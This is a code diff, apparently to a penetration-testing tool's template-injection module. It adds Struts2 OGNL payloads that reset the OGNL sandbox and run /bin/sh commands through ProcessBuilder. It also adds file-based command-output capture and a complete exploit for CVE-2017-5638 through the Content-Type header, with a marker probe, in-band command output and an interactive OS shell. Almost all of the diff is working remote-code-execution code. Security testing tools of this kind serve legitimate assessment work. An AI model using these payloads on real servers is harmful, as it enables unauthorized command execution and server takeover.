@@ -18,10 +18,12 @@ from lib.core.convert import getUnicode
 from lib.core.data import conf
 from lib.core.data import logger
 from lib.core.enums import CUSTOM_LOGGING
+from lib.core.enums import HTTP_HEADER
 from lib.core.enums import PLACE
 from lib.core.settings import SSTI_ERROR_SIGNATURES
 from lib.core.settings import UPPER_RATIO_BOUND
 from lib.request.connect import Connect as Request
+from thirdparty.six.moves.urllib.parse import quote as _quote
 
 
 SSTI_PLACES = (PLACE.GET, PLACE.POST, PLACE.COOKIE, PLACE.CUSTOM_POST)
@@ -164,6 +166,18 @@ _ENGINE_TABLE = (
            (("${new java.io.BufferedReader(new java.io.InputStreamReader(T(java.lang.Runtime).getRuntime().exec('{CMD}').getInputStream())).readLine()}", "SpEL readLine (output)"),
             ("${T(java.lang.Runtime).getRuntime().exec('{CMD}')}", "T(Runtime).exec (blind)"),
             ("${(#rt=@java.lang.Runtime@getRuntime()).exec('{CMD}')}", "OGNL @Runtime@getRuntime (blind)"))),
+    Engine("Struts2 (OGNL)", "java",
+           "%{", "}",
+           r"(?i)(?:ognl\.(?:OgnlException|NoSuchPropertyException|MethodFailedException|InappropriateExpressionException|ExpressionSyntaxException)|com\.opensymphony\.xwork2|There is no Action mapped for|Struts (?:Problem Report|has detected an unhandled exception)|InaccessibleObjectException)",
+           ("%{", "%{}", "%{1/0}"),
+           "%{%d*%d}", "",
+           "%{true}", "%{false}", "true", "false",
+           None, None,  # '%{' is unique in the table -> arithmetic proof alone names Struts2 OGNL
+           "%{%s}",
+           # Struts2 OGNL: modern chain resets the sandbox (#_memberAccess) then reads the process
+           # stdout in-band; the legacy @Runtime@ form is a blind fallback for old (pre-sandbox) Struts.
+           (("%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#p=new java.lang.ProcessBuilder(new java.lang.String[]{'/bin/sh','-c','{CMD}'})).(#p.redirectErrorStream(true)).(#pr=#p.start()).(#sc=new java.util.Scanner(#pr.getInputStream()).useDelimiter('\\\\A')).(#sc.hasNext()?#sc.next():'')}", "memberAccess reset + ProcessBuilder (output)"),
+            ("%{(#a=@java.lang.Runtime@getRuntime().exec('{CMD}'))}", "@Runtime@getRuntime (blind, legacy)"))),
     # -- Ruby ---------------------------------------------------------------------------------------------
     Engine("ERB", "ruby",
            "<%=", "%>",
@@ -250,7 +264,10 @@ def _send(place, parameter, value):
         time.sleep(conf.delay)
 
     old_params = conf.parameters.get(place, "")
-    conf.parameters[place] = _replaceSegment(place, parameter, value)
+    # URL-encode the injected value so payload metacharacters survive on the wire: '%' (OGNL/ERB
+    # delimiters, e.g. Struts2 '%{...}'), '#' (OGNL context vars / fragment delimiter), and '&'/'='/
+    # space would otherwise be mangled or split by the server before the template ever sees them.
+    conf.parameters[place] = _replaceSegment(place, parameter, _quote(value, safe=""))
 
     try:
         kwargs = {"raise404": False, "silent": True}
@@ -587,6 +604,26 @@ def sstiScan():
     debugMsg += "switches (--banner, --dbs, --tables, --users, --sql-query) are ignored"
     logger.debug(debugMsg)
 
+    # CVE-2017-5638 (S2-045): OGNL via the Content-Type header - a distinct, non-reflected Struts2
+    # vector that needs no request parameter, so it is probed once up front.
+    if _probeStruts2Header(conf.url):
+        logger.info("%s header is vulnerable to SSTI (back-end: 'Struts2 (OGNL)', CVE-2017-5638)" % HTTP_HEADER.CONTENT_TYPE)
+        if conf.beep:
+            beep()
+        report = ("---\nParameter: %s ((custom) HEADER)\n    Type: SSTI\n"
+                  "    Title: Struts2 OGNL injection via Content-Type header (CVE-2017-5638)\n"
+                  "    Payload: %s: %%{(#_memberAccess=...).(...)}\n---" % (HTTP_HEADER.CONTENT_TYPE, HTTP_HEADER.CONTENT_TYPE))
+        conf.dumper.singleString(report)
+        if not any(conf.get(_) for _ in ("osCmd", "osShell")):
+            logger.info("the back-end 'Struts2 (OGNL)' allows OS command execution via this injection; "
+                        "you are advised to try '--os-shell' (interactive) or '--os-cmd=<command>' (single command)")
+        if conf.get("osCmd"):
+            _dumpS2045(conf.url, conf.osCmd)
+        if conf.get("osShell"):
+            _osShell(lambda cmd: _dumpS2045(conf.url, cmd))
+        logger.info("SSTI scan complete")
+        return
+
     if not conf.paramDict:
         logger.error("no request parameters to test (use --data, GET params, or similar)")
         return
@@ -641,7 +678,6 @@ def sstiScan():
     if found:
         slot = found[0]
         place, parameter, engine, evidence = slot
-        from lib.core.common import readInput
 
         wantsTakeover = any(conf.get(_) for _ in ("osCmd", "osShell"))
 
@@ -664,12 +700,7 @@ def sstiScan():
                 # Interactive shell runs even under --batch (mirrors the SQL --os-shell, which
                 # reads commands straight from the terminal); EOF / 'exit' / 'quit' leaves it.
                 if conf.get("osShell"):
-                    logger.info("calling SSTI OS shell. Enter commands or 'exit'/'quit' to leave")
-                    while True:
-                        cmd = readInput("os-shell> ", checkBatch=False)
-                        if not cmd or cmd.strip().lower() in ("exit", "quit"):
-                            break
-                        _executeCommand(place, parameter, engine, cmd.strip())
+                    _osShell(lambda cmd: _executeCommand(place, parameter, engine, cmd))
 
     logger.info("SSTI scan complete")
 
@@ -701,6 +732,10 @@ _FILE_RCE = {
         "${new ProcessBuilder(new String[]{'/bin/sh','-c','{CMD} > {OUTFILE}'}).start()}",
         "${new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('{OUTFILE}')))}",
     ),
+    "Struts2 (OGNL)": (
+        "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#p=new java.lang.ProcessBuilder(new java.lang.String[]{'/bin/sh','-c','{CMD} > {OUTFILE} 2>&1'})).(#p.start())}",
+        "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(new java.lang.String(@java.nio.file.Files@readAllBytes(new java.io.File('{OUTFILE}').toPath())))}",
+    ),
 }
 
 
@@ -730,6 +765,12 @@ def _commandOutput(page, baseline, original, payload, engine):
 
     # A template that ECHOED our payload directive instead of executing it is reflection, not output.
     if output and output in payload:
+        return None
+
+    # A bare Process-object toString ("Process[pid=..]" on JDK9+, "java.lang.UNIXProcess@.."/"ProcessImpl@.."
+    # on JDK8) means the command RAN but its stdout was never captured (a blind exec) - not real output,
+    # so reject it and let the caller fall through to the file-based capture (_FILE_RCE).
+    if output and re.search(r"Process\[pid=|(?:UNIXProcess|ProcessImpl|Process)@[0-9a-f]", output):
         return None
 
     if output and _ratio(output, baseText) < UPPER_RATIO_BOUND:
@@ -808,3 +849,78 @@ def _executeCommand(place, parameter, engine, cmd):
         return
 
     logger.warning("no output received for OS command '%s'" % cmd)
+
+
+def _osShell(execFn):
+    """Shared interactive OS-shell loop (runs under --batch like the SQL one). execFn(cmd) runs and
+    reports a single command. EOF / 'exit' / 'quit' leaves."""
+    from lib.core.common import readInput
+    logger.info("calling SSTI OS shell. Enter commands or 'exit'/'quit' to leave")
+    while True:
+        cmd = readInput("os-shell> ", checkBatch=False)
+        if not cmd or cmd.strip().lower() in ("exit", "quit"):
+            break
+        execFn(cmd.strip())
+
+
+# CVE-2017-5638 (S2-045): OGNL injection via the Content-Type header of a Jakarta-multipart Struts2
+# action - a distinct vector from the parameter one: the Content-Type is NOT reflected, so the payload
+# writes its result straight to the HTTP response. The prefix resets OGNL member access and clears the
+# excluded classes/packages (the modern-Struts2 sandbox); {ACTION} prints a marker (detection) or runs
+# a command and copies its stdout to the response (exploitation).
+_S2045_TEMPLATE = ("%{(#nike='multipart/form-data')."
+    "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
+    "(#_memberAccess?(#_memberAccess=#dm):"
+    "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
+    "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
+    "(#ognlUtil.getExcludedPackageNames().clear())."
+    "(#ognlUtil.getExcludedClasses().clear())."
+    "(#context.setMemberAccess(#dm))))."
+    "(#resp=@org.apache.struts2.ServletActionContext@getResponse())."
+    "{ACTION}}")
+
+
+def _s2045Send(url, action):
+    """Send one request carrying the S2-045 Content-Type payload ({ACTION} substituted in)."""
+    payload = _S2045_TEMPLATE.replace("{ACTION}", action)
+    try:
+        page, _, _ = Request.getPage(url=url, auxHeaders={HTTP_HEADER.CONTENT_TYPE: payload},
+                                     raise404=False, silent=True)
+        return getUnicode(page or "")
+    except Exception as ex:
+        logger.debug("S2-045 Content-Type probe failed: %s" % getUnicode(ex))
+        return ""
+
+
+def _probeStruts2Header(url):
+    """Detect CVE-2017-5638 benignly: print a random marker to the response via OGNL (no command
+    execution) and confirm it echoes back. Returns the marker on success, else None."""
+    marker = randomStr(length=16, lowercase=True)
+    action = "(#w=#resp.getWriter()).(#w.print('%s')).(#w.flush())" % marker
+    page = _s2045Send(url, action)
+    return marker if (page and marker in page) else None
+
+
+def _executeStruts2Header(url, cmd):
+    """Run an OS command through the S2-045 Content-Type vector and return its stdout. The output is
+    bracketed by random markers (echoed by the shell) so it slices cleanly out of a response that also
+    carries the action's own HTML."""
+    start, end = randomStr(length=10, lowercase=True), randomStr(length=10, lowercase=True)
+    wrapped = "echo %s; %s 2>&1; echo %s" % (start, cmd, end)
+    action = ("(#p=new java.lang.ProcessBuilder(new java.lang.String[]{'/bin/sh','-c','%s'}))."
+              "(#p.redirectErrorStream(true)).(#pr=#p.start())."
+              "(@org.apache.commons.io.IOUtils@copy(#pr.getInputStream(),#resp.getOutputStream()))."
+              "(#resp.getOutputStream().flush())") % _escapeSingleQuoted(wrapped)
+    page = _s2045Send(url, action)
+    if start in page and end in page:
+        return page.split(start, 1)[-1].split(end, 1)[0].strip("\r\n")
+    return None
+
+
+def _dumpS2045(url, cmd):
+    """Run one command via the S2-045 vector and report its output (or a no-output warning)."""
+    output = _executeStruts2Header(url, cmd)
+    if output is not None:
+        conf.dumper.singleString("\nos-shell (%s) [S2-045 Content-Type]:\n%s" % (cmd, output))
+    else:
+        logger.warning("no output received for OS command '%s'" % cmd)
